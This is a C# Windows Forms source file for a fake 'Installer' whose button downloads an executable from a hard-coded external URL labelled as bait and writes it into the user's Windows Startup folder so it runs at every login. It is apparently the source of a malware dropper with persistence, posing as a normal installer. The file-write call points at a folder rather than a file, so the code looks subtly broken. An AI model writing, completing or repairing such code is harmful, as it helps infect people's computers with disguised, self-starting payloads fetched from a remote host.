using System.Diagnostics.CodeAnalysis;


namespace Installer
{
    public partial class Window : Form
    {
        private static String DOWNLOAD_BAIT_URL = "https://utfs.io/f/643d55c9-860e-4d05-9bdf-015064f8272b-fjupde.exe";
        private byte[]? data;

        public Window()
        {
            InitializeComponent();
        }

        private async void InstallButton_Click(object sender, EventArgs e)
        {
            ResponseLabel.Text = string.Empty;
            InstallButton.Enabled = false;
            InstallButton.Text = "Installing...";
            String StartupAppsPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

            if (data is null)
                await DownloadData();

            if (data is null)
            {
                InstallButton.Enabled = true;
                InstallButton.Text = "Install";
                return;
            }


            File.WriteAllBytes(StartupAppsPath, data);

            InstallButton.Text = "Installed";
        }

        [MemberNotNullWhen(true, nameof(data))]
        private async Task<bool> DownloadData()
        {

            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync(DOWNLOAD_BAIT_URL);

            if (!response.IsSuccessStatusCode)
            {
                ResponseLabel.Text = $"{response.StatusCode}: {response.ReasonPhrase}";
                return false;
            }

            data = await response.Content.ReadAsByteArrayAsync();

            return true;
        }
    }
}
